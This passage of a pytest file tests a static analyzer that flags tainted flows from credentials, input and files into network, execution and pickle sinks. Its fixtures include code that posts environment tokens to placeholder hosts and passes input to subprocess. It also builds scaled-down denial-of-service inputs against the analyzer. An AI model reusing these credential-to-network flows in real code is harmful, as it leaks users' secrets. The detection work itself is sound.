            ("TT5", "Tainted flow: 'body' from requests.get"),
        ]

    def test_new_flows_never_reorder_main_flows(self) -> None:
        """A helper's equal source arriving first through a return does not win."""
        code = _code(
            """
            import os, requests
            def helper():
                inner = os.environ["A"]
                return inner
            def run():
                outer = os.getenv("B")
                mid = outer
                value = helper() + mid  # VALUE
                requests.post("https://x.invalid", data=value)
            """
        )
        (finding,) = _run(code)
        assert finding.message == (
            f"Tainted flow: 'value' from os.getenv (line {_line(code, '# VALUE')}, "
            "credential/environment) → requests.post (network output)"
        )

    def test_equal_sources_keep_the_first_one_to_arrive(self) -> None:
        """Ties are not reordered by the new flows: main's message is kept."""
        code = _code(
            """
            import os, requests
            def normalize(value):
                return value.strip()
            def run():
                primary = os.environ["PRIMARY_TOKEN"]
                fallback = os.getenv("FALLBACK_TOKEN")
                token = normalize(primary)  # FIRST
                if not token:
                    token = fallback
                requests.post("https://api.invalid/v1", headers={"Authorization": token})
            """
        )
        (finding,) = _run(code)
        assert finding.message == (
            f"Tainted flow: 'token' from os.environ (line {_line(code, '# FIRST')}, "
            "credential/environment) → requests.post (network output)"
        )

    def test_a_more_severe_source_arriving_later_still_upgrades(self) -> None:
        """A flow that already fired with a weaker source fires again for a
        more severe one, in both ranked lanes."""
        for first, second, sink, rule, source in (
            (
                "input()",
                'os.getenv("TOKEN")',
                'requests.post("https://x.invalid", data=y)',
                "TT3",
                "os.getenv",
            ),
            ('os.getenv("TOKEN")', "input()", "subprocess.run(y)", "TT5", "input"),
        ):
            code = _code(
                f"""
                import os, requests, subprocess
                a = {first}
                b0 = {second}
                b1 = b0
                b2 = b1
                x = a
                x = b2
                y = x  # Y
                {sink}
                """
            )
            (finding,) = _run(code)
            assert finding.rule_id == rule, sink
            assert f"'y' from {source} (line {_line(code, '# Y')}," in finding.message

    def test_assigned_variables_reach_helpers_in_every_lane(self) -> None:
        """Phase B reads phase A facts again in every lane: a variable
        tainted by plain assignment and passed to a helper reaches an
        execution or deserialization sink there."""
        for setup, helper, rule in (
            ("x = input()", "exec(p)", "TT5"),
            ("x = input()", "subprocess.run(p, shell=True)", "TT5"),
            ('x = open("payload.bin", "rb").read()', "pickle.loads(p)", "TT6"),
            ('x = requests.get("https://x.invalid").content', "pickle.loads(p)", "TT6"),
        ):
            code = _code(
                f"""
                import pickle, requests, subprocess
                def run(p):
                    {helper}  # SINK
                {setup}
                run(x)
                """
            )
            assert _summary(code) == [(rule, _line(code, "# SINK"))], helper

    def test_deserialization_ranks_a_file_above_a_credential(self) -> None:
        for first, second in (
            ('os.getenv("BLOB")', 'open("payload.bin", "rb").read()  # FILE'),
            ('open("payload.bin", "rb").read()  # FILE', 'os.getenv("BLOB")'),
        ):
            code = _code(
                f"""
                import os, pickle
                x = {first}
                x = {second}
                pickle.loads(x)
                """
            )
            (finding,) = _run(code)
            assert finding.rule_id == "TT6", first
            assert f"'x' from open (line {_line(code, '# FILE')}," in finding.message


class TestMessageCompatibility:
    """Messages keep main's wording for every flow main also reports with the
    same rule, except where main's fact came from a same-named variable in
    another scope, where a raised rule at the sink subsumes or re-cites a
    weaker finding, and where an identifier exceeds ``_MAX_NAME_CHARS``.

    Message-glob baseline rules match the message: the variable read at the
    sink and the line of the statement that last tainted it (not the line of
    the original source call).
    """

    def test_reassignment_chain_cites_the_last_assignment(self) -> None:
        code = _code(
            """
            import os, requests
            secret = os.getenv("API_KEY")
            first = secret
            second = first
            requests.post("https://example.invalid", data=second)
            """
        )
        (finding,) = _flows(code)
        assert finding.message == (
            "Tainted flow: 'second' from os.getenv (line 4, credential/environment) "
            "→ requests.post (network output)"
        )

    def test_multiline_assignment_cites_the_assignment_line(self) -> None:
        code = _code(
            """
            import os, requests
            payload = {  # ASSIGN
                "user": "example",
                "key": os.getenv("API_KEY"),
            }
            requests.post("https://example.invalid", json=payload)
            """
        )
        (finding,) = _flows(code)
        assert f"'payload' from os.getenv (line {_line(code, '# ASSIGN')}," in finding.message

    def test_plain_variable_is_cited_before_a_helper_result(self) -> None:
        code = _code(
            """
            import os, subprocess
            def build(args):
                return ["ssh", *args]
            def host():
                return input("host: ")
            args = input("args: ")
            subprocess.run(build(args) + [host()])
            """
        )
        (finding,) = _flows(code, "TT5")
        assert finding.message == (
            "Tainted flow: 'args' from input (line 6, user input) → subprocess.run (code execution)"
        )

    def test_comprehension_at_the_sink_cites_the_outer_variable(self) -> None:
        code = _code(
            """
            import os, requests
            parts = os.getenv("API_KEY").split(",")
            requests.post("https://x.invalid", json=[p for p in parts])
            """
        )
        (finding,) = _flows(code)
        assert "'parts' from os.getenv (line 2," in finding.message

    def test_cross_function_flow_cites_the_binding_call(self) -> None:
        code = _code(
            """
            import os, requests
            def upload(payload):
                requests.post("https://example.invalid", data=payload)
            def main():
                secret = os.getenv("API_KEY")
                upload(secret)  # CALL
            """
        )
        (finding,) = _flows(code)
        assert f"'payload' from os.getenv (line {_line(code, '# CALL')}," in finding.message

    def test_attributes_and_calls_are_named_as_the_sink_spells_them(self) -> None:
        receiver = "client" + "_" * 200
        code = _code(
            f"""
            import os, requests
            class Client:
                def __init__(self):
                    self.token = os.getenv("API_TOKEN")
                def send(self):
                    requests.post("https://x.invalid", headers={{"X-Token": self.token}})
            def main():
                {receiver} = Client()
                if not {receiver}.token:
                    raise SystemExit(1)
            """
        )
        (finding,) = _flows(code)
        assert "'self.token' from os.getenv (line 4," in finding.message
        assert receiver not in finding.message

    @pytest.mark.parametrize(
        ("code", "message"),
        [
            pytest.param(
                "import os, subprocess\n"
                'cmd = os.getenv("A") + open("f").read()\n'
                "subprocess.run(cmd)\n",
                "Tainted flow: 'cmd' from os.getenv (line 2, credential/environment) "
                "→ subprocess.run (code execution)",
                id="exec_credential_and_file",
            ),
            pytest.param(
                "import os, shutil\n"
                "def make_client():\n"
                '    return os.environ.get("TOKEN")\n'
                "def convert(dst):\n"
                "    client = make_client()\n"
                '    pptx_bytes = open("deck.pptx", "rb").read()\n'
                "    pdf_bytes = client.convert_pdf(pptx_bytes)\n"
                "    shutil.copy(pdf_bytes, dst)\n",
                "Tainted flow: 'pdf_bytes' from open (line 7, file read) → shutil.copy (file write)",
                id="file_write_after_helper_credential",
            ),
            pytest.param(
                "import os\n"
                "from pathlib import Path\n"
                "def _get_client():\n"
                '    return Client(os.environ.get("CONVERTER_KEY"))\n'
                "def convert(pptx_path, output_path):\n"
                "    pptx_path = Path(pptx_path)\n"
                "    output_path = Path(output_path)\n"
                "    client = _get_client()\n"
                "    pptx_bytes = pptx_path.read_bytes()\n"
                "    pdf_bytes = client.convert_pdf(pptx_bytes)\n"
                "    output_path.write_bytes(pdf_bytes)\n",
                "Tainted flow: 'pdf_bytes' from pathlib.Path.read_bytes (line 10, file read) "
                "→ pathlib.Path.write_bytes (file write)",
                id="write_bytes_after_helper_credential",
            ),
            pytest.param(
                'import os, shutil\ndata = input() + os.getenv("K")\nshutil.copy(data, "dst")\n',
                "Tainted flow: 'data' from input (line 2, user input) → shutil.copy (file write)",
                id="file_write_input_and_credential",
            ),
            pytest.param(
                "import pickle, requests\n"
                'x = open("f", "rb").read()\n'
                'x = requests.get("https://x.invalid").content\n'
                "pickle.loads(x)\n",
                "Tainted flow: 'x' from open (line 2, file read) → pickle.loads (deserialization)",
                id="deserialization_file_then_network",
            ),
            pytest.param(
                "import os, requests\n"
                'token = os.environ.get("API_TOKEN") or os.getenv("LEGACY_TOKEN")\n'
                'requests.post("https://x.invalid", data=token)\n',
                "Tainted flow: 'token' from os.environ.get (line 2, credential/environment) "
                "→ requests.post (network output)",
                id="two_credentials",
            ),
        ],
    )
    def test_a_same_rule_finding_keeps_mains_message(self, code: str, message: str) -> None:
        """A more severe source replaces the cited one only when it changes the
        rule; otherwise the message names the first source to arrive, as
        ``main`` does, so exact baselines and message globs keep matching."""
        (finding,) = _run(code)
        assert finding.message == message

    @pytest.mark.parametrize(
        ("code", "messages"),
        [
            pytest.param(
                "import json, os, requests\n"
                'config = json.load(open(os.getenv("APP_CONFIG", "config.json")))\n'
                'requests.post(config["webhook_url"], json={"status": "ok"})\n',
                [
                    "TT4 Tainted flow: 'config' from open (line 2, file read) "
                    "→ requests.post (network output)"
                ],
                id="config_path_from_env",
            ),
            pytest.param(
                "import os, requests\n"
                'path = os.getenv("APP_CONFIG")\n'
                "data = open(path).read()\n"
                'requests.post("https://x.invalid", data=data)\n',
                [
                    "TT4 Tainted flow: 'data' from open (line 3, file read) "
                    "→ requests.post (network output)"
                ],
                id="path_variable_from_env",
            ),
            pytest.param(
                "import os, requests\n"
                'token = os.getenv("TOKEN")\n'
                'meta = requests.get("https://x.invalid/a", headers={"A": token}).json()\n'
                'requests.get(meta["url"])\n',
                [
                    "TT2 Tainted flow: 'meta' from requests.get (line 3, network input) "
                    "→ requests.get (network output)",
                    "TT3 Tainted flow: 'token' from os.getenv (line 2, credential/environment) "
                    "→ requests.get (network output)",
                ],
                id="authenticated_get",
            ),
        ],
    )
    def test_a_source_calls_value_is_what_it_reads(self, code: str, messages: list[str]) -> None:
        """A source call's arguments do not flow into its value: a file opened
        at an environment path holds file contents, as ``main`` reports."""
        assert sorted(f"{f.rule_id} {f.message}" for f in _run(code)) == messages

    def test_main_tainted_variables_are_cited_before_bound_parameters(self) -> None:
        """A parameter bound from a call site and read earlier at the sink
        does not take over ``main``'s message for the same rule."""
        for code, message in (
            (
                _code(
                    """
                    import os, requests
                    def send(url):
                        token = os.getenv("TOKEN")
                        requests.post(url, data=token)
                    send(os.getenv("BASE_URL"))
                    """
                ),
                "Tainted flow: 'token' from os.getenv (line 3, credential/environment) "
                "→ requests.post (network output)",
            ),
            (
                _code(
                    """
                    import os, subprocess
                    def run(binary, *args):
                        extra = os.getenv("EXTRA_FLAGS")
                        subprocess.run([binary, extra, *args])
                    run(os.getenv("TOOL"))
                    """
                ),
                "Tainted flow: 'extra' from os.getenv (line 3, credential/environment) "
                "→ subprocess.run (code execution)",
            ),
        ):
            (finding,) = _run(code)
            assert finding.message == message

    def test_a_rule_upgrade_cites_the_first_of_the_most_severe_sources(self) -> None:
        code = (
            "import os, sys, subprocess\n"
            'cmd = os.getenv("A") + (input() + sys.stdin.read())\n'
            "subprocess.run(cmd)\n"
        )
        (finding,) = _run(code)
        assert finding.message == (
            "Tainted flow: 'cmd' from input (line 2, user input) → subprocess.run (code execution)"
        )

    def test_parameters_cite_the_first_source_to_arrive(self) -> None:
        """Through call-site arguments too, the first source to arrive is cited
        whenever a later one gives the same rule."""
        two_callers = _code(
            """
            import os, requests
            def send(value):
                requests.post("https://x.invalid", data=value)
            send(os.getenv("A"))  # FIRST
            send(os.environ.get("B"))
            """
        )
        (finding,) = _run(two_callers)
        assert f"'value' from os.getenv (line {_line(two_callers, '# FIRST')}," in finding.message
        through_helper = _code(
            """
            import os, subprocess
            def run(command):
                subprocess.run(command)
            cmd = os.getenv("A") + open("f").read()
            run(cmd)  # CALL
            """
        )
        (finding,) = _run(through_helper)
        assert finding.message == (
            f"Tainted flow: 'command' from os.getenv (line {_line(through_helper, '# CALL')}, "
            "credential/environment) → subprocess.run (code execution)"
        )
        global_then_parameter = _code(
            """
            import os, requests
            TOKEN = os.getenv("A")
            def send(value):
                body = TOKEN  # GLOBAL
                body = value
                requests.post("https://x.invalid", data=body)
            send(os.environ.get("B"))
            """
        )
        (finding,) = _run(global_then_parameter)
        assert (
            f"'body' from os.getenv (line {_line(global_then_parameter, '# GLOBAL')},"
            in finding.message
        )
        # A value that does not depend on the parameters is preferred over an
        # equally severe one bound from a call site, whichever arrives first.
        state_and_parameter = _code(
            """
            import os, requests
            def token():
                return os.getenv("A")
            def wrapped():
                return token()
            def outer():
                return wrapped()
            def send(value):
                body = value
                body = outer()  # STATE
                requests.post("https://x.invalid", data=body)
            send(os.environ.get("B"))
            """
        )
        (finding,) = _run(state_and_parameter)
        assert (
            f"'body' from os.getenv (line {_line(state_and_parameter, '# STATE')},"
            in finding.message
        )


# ── Resource bounds ─────────────────────────────────────────────────────


def _analyzer_code_objects() -> list:
    """Every code object defined in the taint module (functions, methods, nested)."""
    found: dict[int, object] = {}
    pending: list = []
    for value in vars(behavioral_taint_tracking).values():
        if getattr(value, "__module__", None) != behavioral_taint_tracking.__name__:
            continue
        if isinstance(value, type):
            for attribute in vars(value).values():
                function = getattr(attribute, "__func__", attribute)
                if hasattr(function, "__code__"):
                    pending.append(function.__code__)
                elif isinstance(attribute, property) and attribute.fget is not None:
                    pending.append(attribute.fget.__code__)
        elif hasattr(value, "__code__"):
            pending.append(value.__code__)
    while pending:
        code = pending.pop()
        if id(code) in found:
            continue
        found[id(code)] = code
        pending.extend(const for const in code.co_consts if hasattr(const, "co_code"))
    return list(found.values())


def _operations(code: str) -> int:
    """Lines and loop iterations of the taint analyzer executed on *code*.

    A deterministic work count: unlike wall-clock time it does not depend on
    machine load, and unlike ``check_runtime`` calls it also counts loops that
    never check the deadline. Jumps and branches are counted as well as lines,
    so the iterations of a one-line comprehension or generator count too.
    """
    monitoring = sys.monitoring
    tool = next(candidate for candidate in (3, 4) if monitoring.get_tool(candidate) is None)
    count = [0]
    events = (monitoring.events.LINE, monitoring.events.JUMP, monitoring.events.BRANCH)

    def on_event(*_args: object) -> None:
        count[0] += 1

    monitoring.use_tool_id(tool, "taint-operation-count")
    codes = _analyzer_code_objects()
    try:
        for event in events:
            monitoring.register_callback(tool, event, on_event)
        for code_object in codes:
            monitoring.set_local_events(tool, code_object, sum(events))
        _run(code)
    finally:
        for code_object in codes:
            monitoring.set_local_events(tool, code_object, 0)
        for event in events:
            monitoring.register_callback(tool, event, None)
        monitoring.free_tool_id(tool)
    return count[0]


_ALL_SOURCES = (
    "os.getenv('a') + os.environ.get('a') + open('f').read() + requests.get('u') "
    "+ httpx.post('u') + urllib.request.urlopen('u') + input() + sys.stdin.read()"
)


def _class_redefinitions(n: int) -> str:
    return "class C:0\n" * n + "C()\n" * n


def _typed_redefinitions(n: int) -> str:
    return "class C:\n def m(self, x): return x\n" * n + "c = C()\n" + "c.m(1)\n" * n


def _nested_constructor_calls(n: int) -> str:
    line = "C(" * 40 + "1" + ")" * 40 + "\n"
    return "class C:pass\n" * n + "def C(*a):pass\n" + line * (n // 4)


def _keyword_fanout(n: int) -> str:
    return "def f(**kw):\n    pass\nf(" + "".join(f"k{i}=x," for i in range(n)) + ")\n"


def _keyword_parameters(n: int) -> str:
    params = ",".join(f"p{i}" for i in range(n))
    return f"def f({params}):\n    pass\nf(" + "".join(f"p{i}=x," for i in range(n)) + ")\n"


def _self_attributes(n: int) -> str:
    body = "".join(f"        self.a{i} = y\n        z = self.a{i}\n" for i in range(n))
    return f"class C:\n    def m(self, y):\n{body}"


def _nested_closures(n: int) -> str:
    lines = [" " * d + f"def f{d}(p{d}):" for d in range(40)]
    lines += [" " * 40 + f"v{i} = w + p0" for i in range(n)]
    return "\n".join(lines) + "\n"


def _callback_arguments(n: int) -> str:
    return (
        "import threading\n"
        "def f(*a, **kw):\n    pass\n"
        "threading.Thread(target=f, args=(" + "x," * n + "))\n"
        "ex.submit(f, " + "x," * n + ")\n"
        "threading.Thread(target=f, kwargs={" + "".join(f"'k{i}': x," for i in range(n)) + "})\n"
    )


def _lambda_callee(n: int) -> str:
    return (
        "f = lambda *a, **k: a\nf("
        + "x," * n
        + ")\nf("
        + "".join(f"k{i}=x," for i in range(n))
        + ")\n"
    )


def _same_named_methods(n: int) -> str:
    classes = "".join(f"class K{i}:\n    def m(self, **kw):\n        return kw\n" for i in range(n))
    return classes + "def run(o, x):\n" + "".join(f"    o.m(k{i}=x)\n" for i in range(n))


def _nested_class_constructors(n: int) -> str:
    block = "class Outer:\n class C:\n  def __init__(self, a): pass\n x = C(1)\n"
    return block * n


def _nested_class_methods(n: int) -> str:
    block = "class Outer:\n class C:\n  def m(self, a): pass\n c = C()\n c.m(1)\n"
    return block * n


def _hierarchy_constructors(n: int) -> str:
    return "class B:\n pass\n" + "".join(
        f"class D{i}(B):\n class C:\n  def __init__(self, a): pass\n x = C(1)\n" for i in range(n)
    )


def _variable_of_many_classes(n: int) -> str:
    classes = "".join(f"class K{i}:\n def m(self, x): return x\n" for i in range(n))
    return classes + "".join(f"c = K{i}()\n" for i in range(n)) + "c.m(1)\n" * n


def _attribute_of_many_classes(n: int) -> str:
    classes = "".join(f"class K{i}:\n def m(self, x): return x\n" for i in range(n))
    init = "class H:\n def __init__(self):\n" + "".join(f"  self.x = K{i}()\n" for i in range(n))
    return classes + init + " def go(self, v):\n" + "  self.x.m(v)\n" * n


def _function_redefinitions(n: int) -> str:
    return "def f(x): return x\n" * n + "f(1)\n" * n


def _global_class_redefinitions(n: int) -> str:
    defs = "".join(
        f"def f{i}():\n global C\n class C:\n  def __init__(self, a): pass\n" for i in range(n)
    )
    return defs + "C(1)\n" * n


def _attribute_callback_candidates(n: int) -> str:
    return (
        "".join(f"class C{i}:0\n" for i in range(n))
        + "class H:\n def s(self):\n"
        + "".join(f"  self.v=C{i}()\n" for i in range(n))
        + " def r(self):\n  print("
        + "self.v.m," * n
        + ")\n"
    )


def _multi_class_loads(n: int) -> str:
    return (
        "".join(f"class C{i}:0\n" for i in range(n))
        + "".join(f"x=C{i}()\n" for i in range(n))
        + "y=x.a\n" * n
    )


def _every_source_in_many_locals(n: int) -> str:
    body = "=".join(f"v{i}" for i in range(50)) + "=p\n"
    return f"import os, sys, requests, httpx, urllib.request\ns = {_ALL_SOURCES}\n" + "".join(
        f"def f{i}(p):\n p=s\n {body}f{i}(s)\n" for i in range(n)
    )


def _wide_assignment_in_nested_functions(n: int) -> str:
    depth = max(2, min(n // 10, 90))  # nesting and width grow together
    lines = ["import os, sys, requests, httpx, urllib.request\n", f"s = {_ALL_SOURCES}\n"]
    lines += [" " * i + f"def f{i}(a{i}):\n" for i in range(depth)]
    lines.append(" " * depth + "x=" * n + "+".join(f"a{i}" for i in range(depth)) + "\n")
    lines += [" " * i + f"f{i}(a{i - 1})\n" for i in range(depth - 1, 0, -1)]
    lines.append("f0(s)\n")
    return "".join(lines)


def _nested_callback_arguments(n: int) -> str:
    return "def f(*a):0\n" + ("print(f," * n + "0" + ")" * n + "\n") * 20


def _nested_in_file_calls(n: int) -> str:
    return "def f(a):\n    return a\nx = input()\n" + ("f(" * n + "x" + ")" * n + "\n") * 20


def _wide_inheritance(n: int) -> str:
    out = []
    for c in range(n):
        out.append(f"def g{c}():\n")
        for i in range(16):
            bases = ",".join(f"K{j}" for j in range(i - 1, -1, -1))
            head = f" class K{i}({bases}):\n" if bases else f" class K{i}:\n"
            out.append(head + f"  def m{i}(self, a):\n   self.m0(a)\n   return self.v{i % 4}\n")
    return "".join(out)


def _deep_inheritance(n: int) -> str:
    """One inheritance chain whose depth grows with the file: the base lookup
    must stay bounded (``_MAX_ANCESTORS``), not walk the whole chain."""
    out = ["class K0:\n def m0(self, a):\n  return a\n"]
    for i in range(1, 16 * n):
        out.append(f"class K{i}(K{i - 1}):\n def m{i}(self, a):\n  self.m0(a)\n  return self.v\n")
    return "".join(out)


def _deep_scopes(n: int) -> str:
    """Nesting depth and the number of names grow together."""
    names = ",".join(f"n{i}" for i in range(50 * n))
    return "z = " + "lambda: " * n + "[" + names + "]\n"


def _chained_lambda(n: int) -> str:
    """One lambda with n parameters bound to n names, each called."""
    names = "=".join(f"a{i}" for i in range(n))
    params = ",".join(f"p{i}" for i in range(n))
    return f"q = {{}}\n{names} = lambda {params}: 0\n" + "".join(f"a{i}(**q)\n" for i in range(n))


def _nested_lambda_defaults(n: int, wrap: str = "{}") -> str:
    """Lambdas nested n deep through their defaults (inside *wrap* each level)."""
    expression = "0"
    for _ in range(n):
        expression = f"lambda a={wrap.format(expression)}: 0"
    return "y = g = print\n" + "".join(f"x{i} = {expression}\n" for i in range(4))


def _nested_lambda_defaults_in_calls(n: int) -> str:
    return _nested_lambda_defaults(n, "print({})")


def _nested_lambda_defaults_in_conditionals(n: int) -> str:
    return _nested_lambda_defaults(n, "y if y else {}")


def _many_bases(n: int) -> str:
    """One class listing n in-file bases, its methods called through self."""
    bases = "".join(f"class B{i}:\n def m{i}(self, a):\n  return a\n" for i in range(n))
    names = ", ".join(f"B{i}" for i in range(n))
    calls = "".join(f"  self.m{i}(1)\n" for i in range(n))
    return bases + f"class D({names}):\n def go(self):\n{calls}"


def _forwarded_unpacking(n: int) -> str:
    """Bound calls forwarding ``*args`` / ``**kwargs`` into wide signatures."""
    params = ", ".join(f"p{i}" for i in range(n))
    return (
        f"class B:\n def __init__(self, {params}, *a, **k):\n  pass\n"
        "class C(B):\n def __init__(self, *a, **k):\n"
        + "".join(f"  super().__init__(*a, x{i}=1, **k)\n" for i in range(n))
    )


def _forwarded_keywords(n: int) -> str:
    """Forwarded ``**kwargs`` whose callers pass many names: each forwarding
    binds one slot per callee, however many names its callers pass."""
    params = ",".join(f"p{i}=0" for i in range(n))
    return (
        f"class B:\n def __init__(self, {params}):\n  pass\n"
        "class C(B):\n def __init__(self, **k):\n"
        + "  super().__init__(**k)\n" * n
        + "".join(f"C(p{i}=1)\n" for i in range(n))
    )


# Every denial-of-service repro from the reviews of this change, scaled
# down. Each must cost work linear in its size, so quadrupling the size may
# at most about quadruple the analyzer's executed lines (a quadratic path
# grows 16x).
_DOS_SHAPES = {
    "same_named_classes": (_class_redefinitions, 100),
    "same_named_classes_typed": (_typed_redefinitions, 60),
    "nested_constructor_calls": (_nested_constructor_calls, 80),
    "keyword_fanout": (_keyword_fanout, 200),
    "keyword_parameters": (_keyword_parameters, 150),
    "self_attributes": (_self_attributes, 100),
    "nested_closures": (_nested_closures, 100),
    "callback_arguments": (_callback_arguments, 150),
    "lambda_callee": (_lambda_callee, 150),
    "same_named_methods": (_same_named_methods, 60),
    "nested_class_constructors": (_nested_class_constructors, 60),
    "nested_class_methods": (_nested_class_methods, 60),
    "hierarchy_constructors": (_hierarchy_constructors, 60),
    "variable_of_many_classes": (_variable_of_many_classes, 60),
    "attribute_of_many_classes": (_attribute_of_many_classes, 60),
    "function_redefinitions": (_function_redefinitions, 100),
    "global_class_redefinitions": (_global_class_redefinitions, 60),
    "attribute_callback_candidates": (_attribute_callback_candidates, 60),
    "multi_class_loads": (_multi_class_loads, 80),
    "every_source_in_many_locals": (_every_source_in_many_locals, 10),
    "wide_assignment_in_nested_functions": (_wide_assignment_in_nested_functions, 200),
    "nested_callback_arguments": (_nested_callback_arguments, 15),
    "nested_in_file_calls": (_nested_in_file_calls, 15),
    "wide_inheritance": (_wide_inheritance, 3),
    "deep_inheritance": (_deep_inheritance, 3),
    "deep_scopes": (_deep_scopes, 20),
    "chained_lambda": (_chained_lambda, 150),
    "nested_lambda_defaults": (_nested_lambda_defaults, 40),
    "nested_lambda_defaults_in_calls": (_nested_lambda_defaults_in_calls, 40),
    "nested_lambda_defaults_in_conditionals": (_nested_lambda_defaults_in_conditionals, 40),
    "many_bases": (_many_bases, 100),
    "forwarded_unpacking": (_forwarded_unpacking, 100),
    "forwarded_keywords": (_forwarded_keywords, 100),
}


@pytest.mark.skipif(sys.version_info < (3, 12), reason="sys.monitoring needs Python 3.12")
class TestResourceScaling:
    """Work grows linearly with file size on every adversarial shape."""

    @pytest.mark.parametrize("shape", sorted(_DOS_SHAPES))
    def test_work_is_linear(self, shape: str) -> None:
        generate, size = _DOS_SHAPES[shape]
        small = _operations(generate(size))
        large = _operations(generate(4 * size))
        assert large <= 5 * small, (shape, small, large)

    def test_forwarded_kwargs_cost_one_slot_per_callee(self) -> None:
        """A forwarded ``**k`` into a callee with many definitions and
        parameters costs what an opaque mapping does, not one target per
        keyword name its callers pass (the earlier fan-out was ~16x)."""
        names = [f"b{i}" for i in range(16)]
        params = ",".join(f"{name}=0" for name in names)
        callee = (
            "class f:\n"
            f" def __init__(self,{params}):pass\n def __init__(self,**w):pass\n"
            f" @classmethod\n def __init__(c,{params}):pass\n"
            f" @staticmethod\n def __init__({params}):pass\n"
            f" def __new__(c,{params}):pass\n"
            f"def f({params}):pass\ndef f(**w):pass\n"
        )
        passed = ",".join(
            f"{name}=os.environ['T']" if name == "b0" else f"{name}=1" for name in names
        )
        forwarded = "import os\n" + callee + "def g(**k):\n f(" + "**k," * 300 + ")\n"
        forwarded += f"g({passed})\n"
        opened = forwarded + "m = {}\ng(**m)\n"
        assert _operations(forwarded) <= 2 * _operations(opened)
        assert _operations(forwarded) <= 2 * _operations(forwarded.replace("**k,", "**m,"))


class TestAdversarialInputs:
    """Memory, output size and deadlines on adversarial inputs."""

    def test_memory_does_not_grow_with_identifier_length(self) -> None:
        """No key or message copies an identifier per reference.

        Taint keys built as ``qualname + name`` copied a long function, class or
        method name into every local, attribute and argument slot; messages
        built from the first spelling of an attribute copied a long receiver
        name into every sink. Memory then grew as name length times references.
        """

        def module(length: int) -> str:
            function, cls, method, receiver = "f" * length, "C" * length, "m" * length, "r" * length
            lines = [
                "import os, requests",
                f"def {function}(*args, **kwargs):",
                "    return args",
                f"{function}(" + "x, " * 2000 + "y=x)",
                f"def {function}_locals():",
                *(f"    v{i} = os.getenv('K')" for i in range(1000)),
                f"class {cls}:",
                f"    def {method}(self, y):",
                "        self.a1 = os.getenv('K')",
                *(f"        self.a{i} = y" for i in range(1000)),
                "    def send(self):",
                *("        requests.post('u', data=self.a1)" for _ in range(1000)),
                f"{receiver} = {cls}()",
                f"{receiver}.a1 = os.getenv('K')",
                f"z = {receiver}.a1",
            ]
            return "\n".join(lines) + "\n"

        def analysis_peak(code: str) -> int:
            """Peak memory of the analysis alone, after the source is parsed."""
            parsed = get_python_ast(None, code, "t.py")
            tracemalloc.start()
            try:
                findings = behavioral_taint_tracking._analyze_python(parsed, "t.py")
                assert len(findings) == 1000
                return tracemalloc.get_traced_memory()[1]
            finally:
                tracemalloc.stop()

        short = analysis_peak(module(8))
        long = analysis_peak(module(4000))
        # One copy per distinct local would already cost ~4000 bytes x 1000 (4 MB).
        assert long - short < 2**20

    def test_message_bytes_do_not_grow_with_identifier_length(self) -> None:
        """Messages name what the sink spells, never a long spelling from elsewhere.

        An attribute read named after its first load site copied a 150,000-char
        receiver into each of 10,000 findings (1.4 GB of messages for an 850 KB
        file). Messages are built from the sink's own nodes, and identifiers
        longer than ``_MAX_NAME_CHARS`` are shortened.
        """
        receiver = "R" * 20_000
        sinks = 2_000
        far_spelling = (
            "import os, requests\n"
            f"{receiver} = C()\n{receiver}.a = os.getenv('K')\nz = {receiver}.a\n"
            "class C:\n    def __init__(self):\n        self.a = os.getenv('K')\n"
            "    def m(self):\n" + "        requests.post('u', data=self.a)\n" * sinks
        )
        variable = "v" * 5_000
        nested = "requests.post('u', data=" * 30 + variable + ")" * 30
        long_at_the_sink = (
            f"import os, requests\n{variable} = os.getenv('K')\n" + (nested + "\n") * 30
        )
        for code, count in ((far_spelling, sinks), (long_at_the_sink, 30 * 30)):
            findings = _run(code)
            tainted = [f for f in findings if f.message.startswith("Tainted flow")]
            assert len(tainted) == count
            assert sum(len(f.message) for f in findings) <= 200 * len(findings)

    @pytest.mark.parametrize(
        ("setup", "read"),
        [
            pytest.param(
                "class C:\n    def m(self):\n        self.{long} = os.getenv('K')\n"
                "    def send(self):\n",
                "self.{long}",
                id="self_attribute",
            ),
            pytest.param(
                "class C:\n    def m({long}):\n        {long}.a = os.getenv('K')\n",
                "{long}.a",
                id="receiver_attribute",
            ),
            pytest.param(
                "def {long}():\n    return os.getenv('K')\ndef send():\n",
                "{long}()",
                id="call",
            ),
            pytest.param(
                "class C:\n    def t(self):\n        return os.getenv('K')\n    def m({long}):\n",
                "{long}.t()",
                id="method_call",
            ),
            pytest.param(
                "class {long}:\n    def t(self):\n        return os.getenv('K')\ndef send():\n",
                "{long}().t()",
                id="constructed_call",
            ),
        ],
    )
    def test_every_sink_spelling_is_shortened(self, setup: str, read: str) -> None:
        """Attribute, call and method-call spellings at a sink are capped too."""
        long = "q" * 1_000
        sinks = 20
        header = setup.format(long=long)
        indent = " " * (len(header.splitlines()[-1]) - len(header.splitlines()[-1].lstrip()) + 4)
        if not header.rstrip().endswith(":"):
            indent = " " * 8
        sink = f"{indent}requests.post('u', data={read.format(long=long)})\n"
        findings = _run("import os, requests\n" + header + sink * sinks)
        assert len(findings) == sinks
        cap = behavioral_taint_tracking._MAX_NAME_CHARS
        spelled = read.format(long=long).split(long)[0]
        for finding in findings:
            name = finding.message.split("'")[1]
            assert len(name) <= cap and name.endswith("...")
            assert name.startswith(spelled + "q")

    def test_super_calls_are_spelled_as_written(self) -> None:
        code = _code(
            """
            import os, requests
            class Base:
                def tok(self):
                    return os.getenv("TOKEN")  # RETURN
            class Child(Base):
                def send(self):
                    requests.post("https://x.invalid", data=super().tok())
            """
        )
        (finding,) = _run(code)
        assert finding.message == (
            f"Tainted flow: 'super().tok()' from os.getenv (line {_line(code, '# RETURN')}, "
            "credential/environment) → requests.post (network output)"
        )

    def test_identifiers_up_to_the_cap_are_reported_in_full(self) -> None:
        cap = behavioral_taint_tracking._MAX_NAME_CHARS
        for length, spelled in ((cap, "t" * cap), (cap + 1, "t" * (cap - 3) + "...")):
            name = "t" * length
            code = (
                f"import os, requests\n{name} = os.getenv('K')\nrequests.post('u', data={name})\n"
            )
            (finding,) = _run(code)
            assert finding.message.startswith(f"Tainted flow: '{spelled}' from os.getenv (line 2,")

    def test_one_fact_per_key_whatever_the_number_of_sources(self) -> None:
        """Per-source fact sets multiplied memory; a key keeps one source."""

        def facts(code: str) -> int:
            parsed = get_python_ast(None, code, "t.py")
            index = behavioral_taint_tracking._build_scope_index(parsed.tree)
            graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
            graph.run()
            return sum(len(lane) for slot in graph.facts for lane in slot)

        many = _every_source_in_many_locals(5)
